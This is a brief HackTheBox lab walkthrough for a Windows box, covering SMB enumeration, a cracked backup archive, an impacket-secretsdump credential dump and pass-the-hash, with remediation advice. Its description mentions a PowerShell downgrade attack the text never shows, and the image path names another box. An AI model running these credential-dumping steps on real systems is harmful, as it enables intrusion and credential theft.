---
title: "HTB Walkthrough: Bastion"
description: "Windows box featuring SMB enumeration, PowerShell downgrade attack, and pass-the-hash to gain initial access."
date: 2026-08-02
category: "HackTheBox"
tags: ["htb", "windows", "smb", "powershell", "pass-the-hash"]
platform: "HackTheBox"
difficulty: "Easy"
image: "/images/htb-cypher/htb1.png"
---

# Reconnaissance

```bash
nmap -sC -sV -oA bastion 10.10.11.XXX
```

| Port | Service | Version |
|------|---------|---------|
| 135 | msrpc | Microsoft Windows RPC |
| 139 | netbios-ssn | Microsoft Windows netbios-ssn |
| 445 | smb | Microsoft Windows SMB |
| 3389 | ms-wbt-server | Microsoft Terminal Services |

## Enumeration

Enumerated SMB shares and found a backup file:

```bash
smbclient -L //10.10.11.XXX -N
smbclient //10.10.11.XXX/Backup -N
```

Downloaded `backup.zip` and cracked the password.

## Exploitation

Found credentials in the backup. Logged in via SMB and enumerated the user:

```bash
impacket-secretsdump bastion/username:password@10.10.11.XXX
```

Used pass-the-hash to access the machine.

## Privilege Escalation

Already running as SYSTEM due to misconfigured service permissions.

## Flags

```
user.txt: a******************************
root.txt: 1******************************
```

## Remediation

- Restrict SMB share permissions
- Use strong passwords for archive files
- Follow least privilege for service accounts
